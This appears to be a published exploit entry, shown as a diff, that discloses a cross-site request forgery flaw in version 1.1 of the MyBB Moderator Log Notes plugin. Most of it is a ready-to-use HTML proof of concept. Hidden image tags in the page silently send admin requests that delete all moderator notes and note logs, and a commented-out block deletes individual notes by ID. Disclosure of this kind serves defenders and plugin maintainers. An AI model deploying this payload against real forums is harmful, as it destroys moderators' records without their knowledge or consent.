@@ -1,0 +1,29 @@
+# Exploit Title: MyBB Moderator Log Notes Plugin 1.1 - Cross-Site Request Forgery
+# Date: 2018-05-17
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Software Link: https://community.mybb.com/mods.php?action=view&pid=1105
+# Version: 1.1
+# Tested on: Ubuntu 18.04
+
+# 1. Description:
+# The plugin allows moderators to save notes and display them in a list in the modCP.
+# The CSRF allows an attacker to remotely delete all mod notes and mod note logs 
+# in the modCP & ACP.
+
+# 2. Proof of Concept:
+
+<html>
+	<body>
+		<-- Deletes mod note logs -->
+		<img style="display:none" src="http://localhost/mybb15/admin/index.php?module=tools-modnoteslog&action=dal" alt="">
+		<-- Deletes mod notes -->
+		<img style="display:none" src="http://localhost/mybb15/admin/index.php?module=tools-modnoteslog&action=dmn" alt="">
+		
+		<!-- You can also delete notes individually by the nid (note ID)
+		<img style="display:none" src="http://localhost/mybb15/modcp.php?action=deletenote&nid=3" alt="">
+		<img style="display:none" src="http://localhost/mybb15/modcp.php?action=deletenote&nid=2" alt="">
+		<img style="display:none" src="http://localhost/mybb15/modcp.php?action=deletenote&nid=1" alt="">
+		-->
+	</body>
+</html>
